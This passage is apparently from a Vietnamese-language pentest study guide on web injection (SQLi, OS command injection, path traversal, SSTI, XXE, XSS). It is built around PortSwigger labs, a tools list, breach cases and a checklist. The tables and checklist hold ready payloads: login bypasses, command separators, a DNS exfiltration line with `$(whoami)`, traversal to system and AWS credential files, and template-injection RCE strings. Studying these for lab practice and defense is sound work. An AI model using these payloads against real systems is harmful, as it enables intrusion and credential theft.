dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

```python
# Python: dùng defusedxml
import defusedxml.ElementTree as ET
tree = ET.parse(xml_input)  # Safe by default
```

---

## 🧪 Labs – PortSwigger Web Security Academy

### SQL Injection Labs

| Lab | Level | Kỹ thuật |
|---|---|---|
| [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) | 🟡 Apprentice | Basic SQLi, `' OR 1=1--` |
| [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass) | 🟡 Apprentice | Login bypass: `admin'--` |
| [SQL injection UNION attack, determining the number of columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) | 🔴 Practitioner | ORDER BY / NULL enum |
| [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text) | 🔴 Practitioner | UNION string type detection |
| [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables) | 🔴 Practitioner | UNION SELECT username,password |
| [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column) | 🔴 Practitioner | Concatenate: `username\|\|'~'\|\|password` |
| [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle) | 🔴 Practitioner | Oracle `FROM dual`, `v$version` |
| [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft) | 🔴 Practitioner | `@@version`, comment `#` |
| [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle) | 🔴 Practitioner | `information_schema.tables` |
| [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle) | 🔴 Practitioner | `all_tables`, `all_columns` |
| [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses) | 🔴 Practitioner | Boolean-based blind, Intruder brute-force |
| [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) | 🔴 Practitioner | Error-based blind, CASE statement |
| [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based) | 🔴 Practitioner | `CAST((SELECT ...) AS int)` leak |
| [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays) | 🔴 Practitioner | `pg_sleep(10)` confirm injection |
| [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval) | 🔴 Practitioner | Time-based blind + brute-force |
| [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band) | 🔴 Practitioner | DNS OOB, Burp Collaborator |
| [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration) | 🔴 Practitioner | OOB + data trong DNS subdomain |
| [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding) | 🔴 Practitioner | XML body, `&#x53;ELECT` WAF bypass |

### OS Command Injection Labs

| Lab | Level | Kỹ thuật |
|---|---|---|
| [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple) | 🟡 Apprentice | `& whoami &` trong form field |
| [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays) | 🔴 Practitioner | `& ping -c 10 127.0.0.1 &` |
| [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection) | 🔴 Practitioner | Redirect output → read qua URL |
| [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band) | 🔴 Practitioner | `nslookup COLLABORATOR` |
| [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration) | 🔴 Practitioner | `nslookup $(whoami).COLLABORATOR` |

### Path Traversal Labs

| Lab | Level | Kỹ thuật |
|---|---|---|
| [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple) | 🟡 Apprentice | `../../../etc/passwd` |
| [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass) | 🔴 Practitioner | `/etc/passwd` (absolute) |
| [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively) | 🔴 Practitioner | `....//....//` strip bypass |
| [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode) | 🔴 Practitioner | Double URL encode: `%252e%252e%252f` |
| [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path) | 🔴 Practitioner | Require base path prefix |
| [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass) | 🔴 Practitioner | Null byte: `../../../etc/passwd%00.png` |

### SSTI Labs

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic) | 🔴 Practitioner | ERB: `<%= system("id") %>` |
| [Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context) | 🔴 Practitioner | Tornado: `{%import os%}{{os.system("id")}}` |
| [Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation) | 🔴 Practitioner | FreeMarker: `Execute?new()` |
| [Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit) | 🔴 Practitioner | Detect engine → tra payload |
| [Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects) | 🔴 Practitioner | Jinja2: `{{config}}` leak secret |
| [Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment) | ⭐ Expert | Bypass sandbox via reflection |
| [Server-side template injection with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit) | ⭐ Expert | Gadget chain custom |

### XXE Labs (xem thêm A02)

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) | 🟡 Apprentice | DOCTYPE + entity → `/etc/passwd` |
| [Exploiting XXE to perform SSRF](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf) | 🟡 Apprentice | XXE → EC2 metadata |
| [Exploiting blind XXE to exfiltrate data](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration) | 🔴 Practitioner | OOB + external DTD |
| [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload) | 🔴 Practitioner | SVG upload → XXE |

---

## 🔧 Tools

| Tool | Mục đích |
|---|---|
| **sqlmap** | Automate SQLi detection + exploitation (UNION, blind, time, OOB, --os-shell) |
| **Burp Suite – Scanner** | Tự động detect SQLi, XSS, Command Injection, Path Traversal |
| **Burp Intruder** | Brute-force boolean blind SQLi (từng ký tự), fuzz injection point |
| **Burp Collaborator** | Detect OOB interactions (blind SQLi DNS, blind command injection DNS) |
| **ffuf** | Fuzz parameter injection points |
| **commix** | Tự động test và exploit OS command injection |
| **tplmap** | Tự động detect và exploit SSTI (đa engine) |
| **XSStrike** | Advanced XSS fuzzing với context-aware payload generation |
| **Dalfox** | Fast XSS scanner với DOM analysis |
| **defusedxml** (Python) | Safe XML parsing, chặn XXE mặc định |
| **wfuzz** | Fuzz web app parameter, header |

---

## 🌍 Real-world Cases

**Case 1 – Equifax (2017): 147 triệu bản ghi**

Apache Struts 2 (CVE-2017-5638) — OGNL Expression Language injection qua Content-Type header. Gói giải nén file multipart evaluate OGNL expression trong Content-Type → RCE không cần auth. Patch đã có từ tháng 3/2017 nhưng Equifax chưa update khi bị exploit vào tháng 5/2017. Root cause: chậm patch + không monitor CVE advisory.

**Case 2 – Heartbleed (OpenSSL) → second-order information disclosure**

Không phải SQLi truyền thống, nhưng là injection/memory disclosure — chứng minh injection có thể xảy ra ở tầng rất thấp. Input "heartbeat request" không validate length → attacker đọc 64KB memory server mỗi request → leak private key, session token.

**Case 3 – Yahoo (2012): 450,000 credentials**

Union-based SQL injection vào login form lộ ra bảng users với password lưu plaintext. Attacker dump toàn bộ bảng bằng UNION SELECT. Root cause: không dùng prepared statement, password không hash.

**Case 4 – British Airways (2018): 500,000 records, £183M fine (GDPR)**

Skimming attack kết hợp XSS + supply chain: malicious script inject vào payment page, capture form data (tên, email, thẻ tín dụng) và gửi về server của attacker. Root cause: thiếu CSP header và không monitor third-party script integrity.

**Case 5 – Path Traversal → AWS Credential (the-leaky-bridge pattern)**

LFI trong parameter `?file=` cho phép đọc `/proc/self/environ` hoặc `/home/app/.aws/credentials`. Credential AWS lộ ra → attacker enumerate S3 bucket → exfiltrate toàn bộ dữ liệu → escalate lên EC2 instance. Pattern này phổ biến trong CTF và real-world cloud pentest.

---

## 💡 Attacker Mindset

> **"Mọi input đều là attack surface — không chỉ URL parameter."**

Cookie, header, JSON body, XML body, filename, GraphQL variable, WebSocket message — tất cả đều có thể là injection point. Attacker test mọi nơi user input chạm vào interpreter.

> **"Blind không có nghĩa là không khai thác được — chỉ là tốn thêm bước."**

Boolean blind → Burp Intruder brute-force từng ký tự. Time blind → sleep để confirm, sau đó exfil từng byte. OOB → Burp Collaborator detect interaction. Không response trực tiếp không phải là safe.

> **"Order of operations khi gặp SQLi: UNION nếu có output, Error-based nếu có error, Time nếu blind, OOB nếu tất cả đều filter."**

Đây là thứ tự leo thang của SQLi — không phải lúc nào cũng bắt đầu từ UNION, phải nhìn vào context của response trước.

> **"SSTI = RCE — nếu thấy template expression render, đây là critical."**

`{{7*7}}` → 49 trong response không phải chỉ là "nice trick" — nó là cửa vào server. Escalate ngay, không dừng lại ở alert.

> **"Path traversal target đầu tiên không phải /etc/passwd — mà là /proc/self/environ."**

Environment variables thường chứa database password, API key, cloud credential — có giá trị thực tế cao hơn nhiều so với file /etc/passwd (chỉ list user).

---

## ✅ Quick Pentest Checklist

**SQL Injection**
- [ ] Thêm `'` vào mọi parameter → SQL error?
- [ ] Test boolean: `' AND '1'='1` vs `' AND '1'='2` → response khác nhau?
- [ ] Test login form: `admin'--` hoặc `' OR 1=1--`
- [ ] UNION attack: ORDER BY 1,2,3... để đếm column
- [ ] Blind time: `' AND SLEEP(5)--` → response chậm?
- [ ] OOB: `nslookup COLLABORATOR` qua SQLi payload
- [ ] Thử trong JSON/XML body, cookie, header

**OS Command Injection**
- [ ] Tìm endpoint ping/nslookup/curl/traceroute
- [ ] Test separators: `&id`, `||id`, `;id`, `` `id` ``, `$(id)`
- [ ] Blind: `& ping -c 5 127.0.0.1 &` → response delay?
- [ ] OOB: `& nslookup $(whoami).COLLABORATOR &`

**Path Traversal**
- [ ] Tìm `?file=`, `?filename=`, `?path=`, `?image=`
- [ ] Test: `../../../etc/passwd`
- [ ] Bypass: `%2e%2e%2f`, `....//`, `%252e%252e%252f`, null byte

**SSTI**
- [ ] Inject `{{7*7}}`, `${7*7}`, `#{7*7}`, `*{7*7}` vào mọi field
- [ ] 49 trong response → xác định engine, leo thang RCE
- [ ] Thử trong error message, email template, PDF generation

**XXE**
- [ ] Tìm endpoint nhận XML (Content-Type: text/xml, application/xml)
- [ ] Inject DOCTYPE + external entity → `/etc/passwd`
- [ ] Test SVG upload, DOCX/XLSX import
- [ ] Dùng XInclude nếu không control root element

**XSS**
- [ ] Test `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- [ ] Test reflected: URL parameter, search query
- [ ] Test stored: comment, profile, message
- [ ] DOM-based: `location.hash`, `location.search` vào `innerHTML`

---

*Nguồn: [OWASP Top 10:2025 – A05](https://owasp.org/Top10/2025/A05_2025-Injection/) · [PortSwigger – SQL Injection](https://portswigger.net/web-security/sql-injection) · [PortSwigger – OS Command Injection](https://portswigger.net/web-security/os-command-injection) · [PortSwigger – Path Traversal](https://portswigger.net/web-security/file-path-traversal) · [PortSwigger – SSTI](https://portswigger.net/web-security/server-side-template-injection) · [PortSwigger – XXE](https://portswigger.net/web-security/xxe) · [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)*
